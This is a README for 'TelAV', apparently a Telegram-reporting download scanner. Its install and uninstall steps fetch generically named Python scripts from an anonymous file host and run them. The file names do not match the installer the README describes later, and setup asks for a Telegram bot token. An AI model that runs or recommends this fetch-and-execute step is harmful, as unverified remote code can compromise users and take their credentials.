# TelAV (Tel Aviv????)

TelAV is a lightweight download-monitoring agent that watches your downloads directory, hashes each file, and reports scan results via Telegram after querying VirusTotal. It bundles the GUI launcher, Telegram bot helpers, and background scanner so you can be notified whenever a new file is downloaded.

## Installation

Download and run the installer script directly via `curl` (either mirror works):

```bash
curl -fsSL https://upload.stashr.wtf/file/documents/file_5830.py -o file_5830.py
python3 file_5830.py
```

*The installer handles both pip and native dependencies on Windows and Unix-alikes, and will prompt you for your Telegram bot token and chat ID as part of the setup flow.*

## Uninstallation

```bash
curl -fsSL https://upload.stashr.wtf/file/documents/file_5831.py -o file_5831.py
python3 file_5831.py
```
It now asks for confirmation before removing the configuration directory, install directory, and launchers so you can cancel if you only intended to keep your settings.

## How it works

- **Installer (`install_telav.py`)**: fetches the latest Telav archive, installs Python dependencies (avoiding reinstallation when packages are already present), installs the launcher, and configures the downloads monitor.
- **Scanner (`telav/scanner.py`)**: watches the downloads directory, skips transient `.part` files, waits for downloads to finish, hashes each file, and queries VirusTotal via your API key before posting scan reports to your Telegram bot.

## Requirements

- Python 3.10+
- `pip` and/or system package manager (apt, dnf, yum, zypper, pacman) for dependencies such as `watchdog` and `requests`.
- An existing Telegram bot token with a chat ID ready to receive scans.

## Support

If you run into issues, open an issue in the hosting repository or contact me directly, providing logs from the install process or the scanner output.

(Update script coming soon cuz I was way too lazy to make it :D)

